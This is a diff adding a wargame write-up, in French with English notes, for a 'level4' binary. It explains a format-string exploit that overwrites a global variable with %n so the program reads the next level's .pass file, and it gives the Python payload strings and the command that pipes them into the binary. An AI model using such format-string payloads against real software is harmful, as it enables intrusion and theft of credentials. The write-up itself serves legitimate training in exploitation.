@@ -1,0 +1,48 @@
+after printf eax = 0x1d
+
+then mov content of global in eax.
+
+eax = content of globalal.
+
+then compare
+
+and jump or not
+
+global = 0x080484a7 (m)
+
+EAX: 0x8048590 ("/bin/cat /home/user/level5/.pass")
+
+system offset : 0x08048360
+
+payload : 
+
+python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n - ")'
+
+===============================================================================
+
+Ici le binaire ressemble a celui de l'exercice precedent sauf que le nombre
+dans EAX est superieur au buffer que l'on a.
+
+On ne peut pas faire comme dans l'exercie precedent 
+(remplire le buffer de 0x1025544).
+
+j'ai utiliser une option de printf pour afficher x fois un caractere.
+
+Pareil que dans l'exercie precedent on recupere l'adresse de notre globale avec
+objdump, on la cherche a coup de "AAAA%xBBBB" * x, une fois qu'elle est
+localiser on utilise %c est on specifie le nombre de caractere a ecrire sur
+stdout ce qui donne :
+
+python -c 'print("\x10\x98\x04\x08" + "%16930112c" + "%12$n - ")'
+
+0x1025544 en decimal vaut 16930116. 
+
+On soustrait les 4 octets qui servent a afficher l'adresse de la global.
+
+On enregistre la sortie dans un fichier (pas obligatoire)
+
+et on execute:
+
+/tmp/payload | ./level4
+
+A la fin nous avons bien le contenue du fichie .pass du level suivant.
